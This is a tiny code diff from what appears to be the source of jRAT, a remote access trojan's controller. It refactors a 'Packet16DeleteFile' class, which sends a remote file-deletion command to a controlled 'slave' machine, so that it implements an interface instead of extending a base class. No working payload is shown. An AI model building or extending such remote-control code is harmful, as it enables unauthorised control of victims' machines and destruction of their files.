@@ -3,7 +3,7 @@ package jrat.controller.packets.outgoing;
 import jrat.controller.Slave;
 
 
-public class Packet16DeleteFile extends AbstractOutgoingPacket {
+public class Packet16DeleteFile implements OutgoingPacket {
 
 	private String file;
 
